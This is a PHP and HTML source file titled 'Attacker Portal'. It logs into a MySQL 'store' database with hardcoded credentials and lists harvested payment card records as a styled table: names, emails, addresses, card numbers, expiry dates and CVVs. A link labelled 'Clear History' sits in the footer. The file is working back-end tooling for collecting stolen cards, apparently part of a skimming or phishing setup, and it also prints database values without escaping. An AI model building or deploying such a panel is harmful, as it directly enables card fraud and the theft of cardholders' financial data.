<?php

$user = 'user';

//database user password
$pass = 'userpass';

// database name
$mydatabase = 'store';
// check the mysql connection status
$host = 'db1';

$conn = new mysqli($host, $user, $pass, $mydatabase);

// // Check connection
// if ($conn->connect_error) {
//   die("Connection failed: " . $conn->connect_error);
// }

// $sql = "SELECT * FROM ShippingAddress";
// $result = $conn->query($sql);





// $sql = "SELECT * FROM Cards";
$sql = "select * from ShippingAddress s right join Cards c on s.id=c.user_id";


$result = $conn->query($sql);

// if ($result->num_rows > 0) {
//   // output data of each row

//   while($row = $result1->fetch_assoc()) {
//     echo "id: " . $row["id"]. " - Name: " . $row["firstname"]. " " . $row["lastname"]. "<br>";
//   }
// } else {
//   echo "0 results";
// }


// $conn->close();
?>


<html>
<head>
<title> Attacker Portal </title>


<style>
body {
	 font-family: 'lato', sans-serif;
}
 .footer {
   position: fixed;
   left: 0;
   bottom: 0;
   width: 100%;
   text-align: center;
}
 .container {
	 max-width: 90%;
	 margin-left: auto;
	 margin-right: auto;
	 padding-left: 10px;
	 padding-right: 10px;
}
 h2 {
	 font-size: 26px;
	 margin: 20px 0;
	 text-align: center;
}
 h2 small {
	 font-size: 0.5em;
}
 .responsive-table li {
	 border-radius: 3px;
	 padding: 25px 30px;
	 display: flex;
	 justify-content: space-between;
	 margin-bottom: 25px;
}
 .responsive-table .table-header {
	 background-color: #95a5a6;
	 font-size: 14px;
	 text-transform: uppercase;
	 letter-spacing: 0.03em;
}
 .responsive-table .table-row {
	 background-color: #fff;
	 box-shadow: 0px 0px 9px 0px rgba(0, 0, 0, 0.1);
}
 .responsive-table .col-1 {
	 flex-basis: 5%;
}
 .responsive-table .col-2 {
	 flex-basis: 15%;
}
 .responsive-table .col-3 {
	 flex-basis: 15%;
}
 .responsive-table .col-4 {
	 flex-basis: 10%;
}
.responsive-table .col-5 {
	 flex-basis: 5%;
}
.responsive-table .col-6 {
	 flex-basis: 5%;
}
.responsive-table .col-7 {
	 flex-basis: 5%;
}
.responsive-table .col-8 {
	 flex-basis: 10%;
}
.responsive-table .col-9 {
	 flex-basis: 15%;
}
.responsive-table .col-10 {
	 flex-basis: 5%;
}
.responsive-table .col-11 {
	 flex-basis: 5%;
}
.responsive-table .col-12 {
	 flex-basis: 5%;
}
 @media all and (max-width: 767px) {
	 .responsive-table .table-header {
		 display: none;
	}
	 .responsive-table li {
		 display: block;
	}
	 .responsive-table .col {
		 flex-basis: 100%;
	}
	 .responsive-table .col {
		 display: flex;
		 padding: 10px 0;
	}
	 .responsive-table .col:before {
		 color: #6c7a89;
		 padding-right: 10px;
		 content: attr(data-label);
		 flex-basis: 50%;
		 text-align: right;
	}
}
 
</style>
</head>
<body>

<div class="container">
  <h2>Cards Information</h2>
  <ul class="responsive-table">
  <li class="table-header">
      <div class="col col-1">ID</div>
      <div class="col col-2">Full Name</div>
      <div class="col col-3">Email</div>
      <div class="col col-4">Address</div>
      <div class="col col-5">City</div>
      <div class="col col-6">State</div>
      <div class="col col-7">Zip Code</div>
      <div class="col col-8">Name on Card</div>
      <div class="col col-9">Card Number</div>
      <div class="col col-10">Exp Month</div>
      <div class="col col-11">Exp Year</div>
      <div class="col col-12">CVV</div>
</li>
    <?php
    while($row = $result->fetch_assoc()) {
        echo "<li class='table-row'>";
        echo "<div class='col col-1'>". $row['id'] ."</div>";
        echo "<div class='col col-2'>". $row['full_name'] . "</div>";
        echo "<div class='col col-3'>" . $row['email'] . "</div>";
        echo "<div class='col col-4'>" . $row['address'] . "</div>";
        echo "<div class='col col-5'>" . $row['city'] . "</div>";
        echo "<div class='col col-6'>" . $row['state'] . "</div>";
        echo "<div class='col col-7'>" . $row['zip'] . "</div>";
        echo "<div class='col col-8'>" . $row['cardname'] . "</div>";
        echo "<div class='col col-9'>" . $row['cardnumber'] . "</div>";
        echo "<div class='col col-10'>" . $row['expmonth'] . "</div>";
        echo "<div class='col col-11'>" . $row['expyear'] . "</div>";
        echo "<div class='col col-12'>" . $row['cvv'] . "</div>";
        echo "</li>";
        }
    ?>
  </ul>
</div>
<div class="footer">
  <a href="/clear.php">Clear History</a>
</div>
</body>
</html>